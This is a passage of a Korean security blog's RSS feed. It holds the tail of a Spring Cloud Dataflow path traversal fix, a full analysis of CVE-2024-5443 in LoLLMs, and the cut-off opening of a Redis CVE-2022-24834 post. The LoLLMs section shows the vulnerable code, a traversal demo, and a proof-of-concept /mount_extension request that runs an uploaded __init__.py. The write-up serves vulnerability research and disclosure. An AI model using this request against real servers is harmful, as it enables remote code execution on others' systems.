jsx">@Transactionalpublic PackageMetadata upload(UploadRequest uploadRequest) {    Path packageDirPath = TempFileUtils.createTempDirectory(<span class="hljs-string">&quot;skipperUpload&quot;</span>);    validateUploadRequest(packageDirPath, uploadRequest);</code></pre></li><li><p>validateUploadRequest &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;,  <code>canonicalDestinationFilepath</code>&#xAC00; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xD45C;&#xC900; &#xACBD;&#xB85C;&#xC778; <code>canonicalDestinationDirPath</code> &#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; <code>../../</code> &#xC640; &#xAC19;&#xC740; path traversal &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD568;.</p> <pre><code class="hljs jsx">private <span class="hljs-keyword">void</span> validateUploadRequest(Path packageDirPath, UploadRequest uploadRequest) throws IOException {    <span class="hljs-comment">// Existing null checks...</span>    File destinationFile = <span class="hljs-keyword">new</span> File(packageDirPath.toFile(), uploadRequest.getName().trim());    <span class="hljs-built_in">String</span> canonicalDestinationDirPath = packageDirPath.toFile().getCanonicalPath();    <span class="hljs-built_in">String</span> canonicalDestinationFile = destinationFile.getCanonicalPath();    <span class="hljs-keyword">if</span> (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath + File.separator)) {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SkipperException(<span class="hljs-string">&quot;Entry is outside of the target dir: &quot;</span> + uploadRequest.getName());    }}</code></pre></li><li><p>&#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xB97C; trim()&#xC744; &#xD1B5;&#xD574; sanitization&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAE30;&#xD0C0; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xC870;&#xC791; &#xB4F1;&#xC744; &#xBC29;&#xC9C0;&#xD568;.</p> <pre><code class="hljs jsx"><span class="hljs-built_in">String</span> fullName = uploadRequest.getName().trim() + <span class="hljs-string">&quot;-&quot;</span> + uploadRequest.getVersion().trim() + <span class="hljs-string">&quot;.&quot;</span> + uploadRequest.getExtension().trim();Path packageFile = Paths.get(packageDir.getPath() + File.separator + fullName);</code></pre></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-write/">arbitrary file write</category>
      
      <category domain="https://hackyboiz.github.io/tags/Spring-Cloud-Dataflow/">Spring Cloud Dataflow</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/24/l0ch/2024-08-24/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-5443: LoLLMs의 Path Traversal로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/21/ogu123/cve-2024-5443/</link>
      <guid>https://hackyboiz.github.io/2024/08/21/ogu123/cve-2024-5443/</guid>
      <pubDate>Wed, 21 Aug 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.huntr.com/critical-path-traversal-flaw-leads</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms">https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LoLLMs &lt;= 5.9.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>LoLLMs(Lord of Large Language Models Server)&#xB294; 500&#xAC1C;&#xC758; &#xC5B8;&#xC5B4; &#xBAA8;&#xB378;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xB85C; Path Traversal&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD574; Path Traversal &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py</span><span class="hljs-comment"># ... more code</span><span class="hljs-meta">@router.post(&quot;/get_personality_config&quot;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_personality_config</span>(<span class="hljs-params">data:PersonalityDataRequest</span>):</span>print(<span class="hljs-string">&quot;- Recovering personality config&quot;</span>)category = sanitize_path(data.category) <span class="hljs-comment"># [1]</span>name = sanitize_path(data.name) <span class="hljs-comment"># [2]</span>  package_path = <span class="hljs-string">f&quot;<span class="hljs-subst">{category}</span>/<span class="hljs-subst">{name}</span>&quot;</span> <span class="hljs-comment"># [3]</span><span class="hljs-keyword">if</span> category==<span class="hljs-string">&quot;custom_personalities&quot;</span>:<span class="hljs-comment"># ...</span><span class="hljs-keyword">else</span>: package_full_path = lollmsElfServer.lollms_paths.personalities_zoo_path/package_path <span class="hljs-comment"># [4]</span> config_file = package_full_path / <span class="hljs-string">&quot;config.yaml&quot;</span> <span class="hljs-keyword">if</span> config_file.exists(): <span class="hljs-keyword">with</span> open(config_file,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f: config = yaml.safe_load(f) <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-literal">True</span>, <span class="hljs-string">&quot;config&quot;</span>:config} <span class="hljs-comment"># ...</span></code></pre><p><code>/get_personality_config</code> &#xC564;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; [1][2]&#xBC88;&#xC5D0;&#xC11C; data.category&#xC640; data.name &#xAC12;&#xC774; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAC12;&#xB4E4;&#xC740; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sanitize_path</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">path:str, </span></span><span class="hljs-function"><span class="hljs-params">allow_absolute_path:bool=False, </span></span><span class="hljs-function"><span class="hljs-params">error_text=<span class="hljs-string">&quot;Absolute database path detected&quot;</span>, </span></span><span class="hljs-function"><span class="hljs-params">exception_text =<span class="hljs-string">&quot;Detected an attempt of path traversal. Are you kidding me?&quot;</span></span></span><span class="hljs-function"><span class="hljs-params"></span>):</span> <span class="hljs-keyword">if</span> path <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: <span class="hljs-keyword">return</span> path <span class="hljs-comment"># Regular expression to detect patterns like &quot;....&quot; and multiple forward slashes</span> suspicious_patterns = re.compile(<span class="hljs-string">r&apos;(\\.\\.+)|(/+/)&apos;</span>) <span class="hljs-keyword">if</span> suspicious_patterns.search(str(path)) <span class="hljs-keyword">or</span> ((<span class="hljs-keyword">not</span> allow_absolute_path) <span class="hljs-keyword">and</span> Path(path).is_absolute()): ASCIIColors.error(error_text) <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">400</span>, detail=exception_text) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> allow_absolute_path: path = path.lstrip(<span class="hljs-string">&apos;/&apos;</span>) <span class="hljs-keyword">return</span> path</code></pre><p><code>sanitize_path</code> &#xD568;&#xC218;&#xB294; <code>../</code> , <code>/</code> , <code>\\</code> &#xC640; &#xAC19;&#xC740; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xC5EC; Path Traversal &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, &#xBE48; &#xBB38;&#xC790;&#xC5F4;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD558;&#xC5EC; Path Traversal &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; category = <span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">&gt;&gt;</span>&gt; name = <span class="hljs-string">&quot;tmp/hacked&quot;</span><span class="hljs-meta">&gt;&gt;</span>&gt; package_path = f<span class="hljs-string">&quot;{category}/{name}&quot;</span><span class="hljs-meta">&gt;&gt;</span>&gt; package_path<span class="hljs-string">&apos;/tmp/hacked&apos;</span><span class="hljs-meta">&gt;&gt;</span>&gt; package_full_path = Path(<span class="hljs-string">&quot;/home/user/public/&quot;</span>)/package_path<span class="hljs-meta">&gt;&gt;</span>&gt; package_full_pathPosixPath(<span class="hljs-string">&apos;/tmp/hacked&apos;</span>)</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; <code>data.category</code>&#xC5D0; &#xBE48; &#xBB38;&#xC790;&#xC5F4;&#xC744;, <code>data.name</code>&#xC5D0; &#xD2B9;&#xC815; &#xACBD;&#xB85C;(&#x201C;tmp/hacked&#x201D;)&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74;,  <code>package_path</code>&#xB294; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xACBD;&#xB85C;&#xAC00; &#xACB0;&#xD569;&#xB420; &#xB54C; <code>package_path</code>&#xAC00; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xC774;&#xBBC0;&#xB85C; &#xC55E;&#xC758; &#xACBD;&#xB85C;(&#x201C;/home/user/public/&#x201C;)&#xB294; &#xBB34;&#xC2DC;&#xB418;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC758;&#xB3C4;&#xD55C; &#xACBD;&#xB85C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; Path Traversal &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nix"><span class="hljs-comment"># lollms_core\\lollms\\server\\endpoints\\lollms_extensions_infos.py</span><span class="hljs-comment"># ... more code</span>@router.post(<span class="hljs-string">&quot;/mount_extension&quot;</span>)def mount_extension(data:ExtensionMountingInfos): print(<span class="hljs-string">&quot;- Mounting extension&quot;</span>)  <span class="hljs-attr">category</span> = sanitize_path(data.category) <span class="hljs-attr">name</span> = sanitize_path(data.folder)  <span class="hljs-attr">package_path</span> = f<span class="hljs-string">&quot;{category}/{name}&quot;</span> <span class="hljs-attr">package_full_path</span> = lollmsElfServer.lollms_paths.extensions_zoo_path/package_path  <span class="hljs-attr">config_file</span> = package_full_path / <span class="hljs-string">&quot;config.yaml&quot;</span> <span class="hljs-comment"># [5]</span>  <span class="hljs-keyword">if</span> config_file.exists(): lollmsElfServer.config[<span class="hljs-string">&quot;extensions&quot;</span>].append(package_path) <span class="hljs-comment"># [6]</span> lollmsElfServer.<span class="hljs-attr">mounted_extensions</span> = lollmsElfServer.rebuild_extensions() <span class="hljs-comment"># [7]</span> <span class="hljs-comment"># ...</span></code></pre><p>CVE-2024-4320 &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>/install_extension</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>/install_extension</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB294; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;, <code>/mount_extension</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC5EC;&#xC804;&#xD788;<code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C;, <code>package_full_path</code>&#xC758; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xC5EC; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>[5]&#xBC88;&#xC5D0;&#xC11C;, &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; <code>config.yaml</code> &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74;<code>package_full_path</code>&#xAC00; <code>lollmsElfServer.config[&quot;extensions&quot;]</code>&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4; [7]&#xBC88;&#xC5D0;&#xC11C; <code>lollmsElfServer.rebuild_extensions()</code> &#xD568;&#xC218;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># lollms_webui.py</span><span class="hljs-comment"># ... more code</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LOLLMSWebUI</span>(<span class="hljs-title">LOLLMSElfServer</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebuild_extensions</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, reload_all=False)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-comment"># ...</span>        <span class="hljs-keyword">for</span> i, extension <span class="hljs-keyword">in</span> enumerate(<span class="hljs-keyword">self</span>.config[<span class="hljs-string">&apos;extensions&apos;</span>])<span class="hljs-symbol">:</span>            <span class="hljs-comment"># ...</span>            <span class="hljs-keyword">if</span> extension <span class="hljs-keyword">in</span> <span class="hljs-symbol">loaded_names:</span>                <span class="hljs-comment"># ...</span>            <span class="hljs-symbol">else:</span>                extension_path = <span class="hljs-keyword">self</span>.lollms_paths.extensions_zoo_path / f<span class="hljs-string">&quot;{extension}&quot;</span>                <span class="hljs-symbol">try:</span>                    extension = ExtensionBuilder().build_extension(extension_path, <span class="hljs-keyword">self</span>.lollms_paths, <span class="hljs-keyword">self</span>)                <span class="hljs-comment"># ...</span></code></pre><p>[5]&#xBC88;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xBAA8;&#xB4E0; <code>extension_path</code>&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xBA74;&#xC11C;, <code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># lollms_core\lollms\extension.py</span><span class="hljs-comment"># ... more code</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExtensionBuilder</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_extension</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">self</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">extension_path:</span> str,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">lollms_paths:</span> LollmsPaths,</span></span><span class="hljs-function"><span class="hljs-params">        app,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">installation_option:</span> InstallOption = InstallOption.INSTALL_IF_NECESSARY</span></span><span class="hljs-function"><span class="hljs-params">    )</span></span> -&gt; <span class="hljs-symbol">LOLLMS_Extension:</span>        extension, script_path = <span class="hljs-keyword">self</span>.getExtension(extension_path, lollms_paths, app)  <span class="hljs-comment"># [8]</span>        <span class="hljs-keyword">return</span> extension(app=app, installation_option=installation_option)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getExtension</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">self</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">extension_path:</span> str,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">lollms_paths:</span> LollmsPaths,</span></span><span class="hljs-function"><span class="hljs-params">        app</span></span><span class="hljs-function"><span class="hljs-params">    )</span></span> -&gt; <span class="hljs-symbol">LOLLMS_Extension:</span>        extension_path = lollms_paths.extensions_zoo_path / extension_path        <span class="hljs-comment"># &#xBAA8;&#xB4C8;&#xC758; &#xC804;&#xCCB4; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xC815;&#xC758;</span>        absolute_path = extension_path.resolve()        <span class="hljs-comment"># &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xBAA8;&#xB4C8; &#xC774;&#xB984; &#xCD94;&#xCD9C;</span>        module_name = extension_path.stem        <span class="hljs-comment"># importlib&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xBAA8;&#xB4C8; &#xB85C;&#xB4DC;</span>        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / <span class="hljs-string">&quot;__init__.py&quot;</span>))  <span class="hljs-comment"># [9]</span>        extension_module = loader.load_module()        <span class="hljs-symbol">extension:</span> LOLLMS_Extension = getattr(extension_module, extension_module.extension_name)        <span class="hljs-keyword">return</span> extension, absolute_path</code></pre><p><code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;, [8]&#xBC88;&#xC5D0;&#xC11C; <code>ExtensionBuilder().getExtension()</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>extension_path</code>&#xB294; &#xACF5;&#xACA9;&#xC790; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574;, <code>absolute_path</code> &#xBCC0;&#xC218;&#xC758; &#xAC12;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4;, [9]&#xBC88;&#xC5D0;&#xC11C; <code>ExtensionBuilder().getExtension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; <code>__init__.py</code> &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/21/ogu123/cve-2024-5443/image1.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD558;&#xAE30; &#xC704;&#xD574; &#xBA3C;&#xC800; &#xC784;&#xC758;&#xC758; &#xB300;&#xD654;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4;, <code>config.yaml</code>&#xACFC; <code>__init__.py</code> &#xD30C;&#xC77C;&#xC744; &#x201C;Send file to AI&#x201D; &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs groovy">POST <span class="hljs-regexp">/mount_extension HTTP/</span><span class="hljs-number">1.1</span><span class="hljs-attr">Host:</span> <span class="hljs-attr">localhost:</span><span class="hljs-number">1337</span>Content-<span class="hljs-attr">Type:</span> application/jsonContent-<span class="hljs-attr">Length:</span> <span class="hljs-number">177</span>{ <span class="hljs-string">&quot;category&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;folder&quot;</span>: <span class="hljs-string">&quot;/path/to/personal_data/discussion_databases/default/&lt;discussion_id&gt;/text_data&quot;</span>, <span class="hljs-string">&quot;client_id&quot;</span>: <span class="hljs-string">&quot;jg9yock1FmRZdONsAAAH&quot;</span>, <span class="hljs-string">&quot;language&quot;</span>: <span class="hljs-string">&quot;vi&quot;</span>}</code></pre><p>&#xC5C5;&#xB85C;&#xB4DC;&#xB41C; <code>config.yaml</code>&#xACFC; <code>__init__.py</code> &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xC5EC; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74;, <code>__init__.py</code> &#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xB54C;, <code>discussion_id</code>&#xAC12;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0;&#xB9CC; &#xC815;&#xC218;&#xAC12;&#xC774;&#xBBC0;&#xB85C; brute-force &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/21/ogu123/cve-2024-5443/image2.png" alt></p><p><code>__init__.py</code> &#xD30C;&#xC77C; &#xB0B4;&#xC5D0;&#xC11C; calc.exe &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>lollms_extensions_infos.py</code> &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xC5EC; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f#diff-a439c41fae59a1b420f981f6a87c9ce17432a89dbc6165c89002894a52fdec1e">https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f#diff-a439c41fae59a1b420f981f6a87c9ce17432a89dbc6165c89002894a52fdec1e</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Path-Traversal/">Path Traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/LoLLMs/">LoLLMs</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/21/ogu123/cve-2024-5443/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 1day1document : CVE-2022-24834</title>
      <link>https://hackyboiz.github.io/2024/08/18/pwndorei/1day1document_CVE-2022-24834/</link>
      <guid>https://hackyboiz.github.io/2024/08/18/pwndorei/1day1document_CVE-2022-24834/</guid>
      <pubDate>Sun, 18 Aug 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xB610; &#xB2E4;&#xC2DC; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xBC88;&#xC5D0;&#xB294; Redis&#xC785;&#xB2C8;&#xB2E4;!  Redis&#xBA74; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC778;&#xB370; &#xB9C9; query&#xB97C; &#xB0A0;&#xB9B0;&#xB2E4;&#xAC70;&#xB098; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xAC70;&#xB098; &#xADF8;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB2C8;&#xACE0;&#xC694; &#x314B;&#x314B;&#x314B;&#x314B; &#xC624;&#xD788;&#xB824; &#xC804;&#xC5D0; &#xB2E4;&#xB8EC; Adobe &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xD2BC; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC81C;&#xBAA9;&#xC5D0; &#xC4F0;&#xC5EC;&#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; CVE-2022-24834 &#xBD84;&#xC11D; &#xBC0F; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774;&#xACE0; &#xC800;&#xBC88;&#xCC98;&#xB7FC; &#xC54C;&#xCC28;&#xAC8C; &#xB2F4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/90n64h.gif" alt="90n64h.gif"></p><blockquote><p><del>&#xB108;&#xBB34; &#xC54C;&#xCC28;&#xC11C; &#xC0AC;&#xACE0; &#xC815;&#xC9C0;&#xB418;&#xC5B4;&#xB3C4; &#xC804; &#xBAA8;&#xB985;&#xB2C8;&#xB354;</del></p></blockquote><h1 id="1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;"><a href="#1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;" class="headerlink" title="1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;"></a>1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2022-24834&#xB294; in-memory 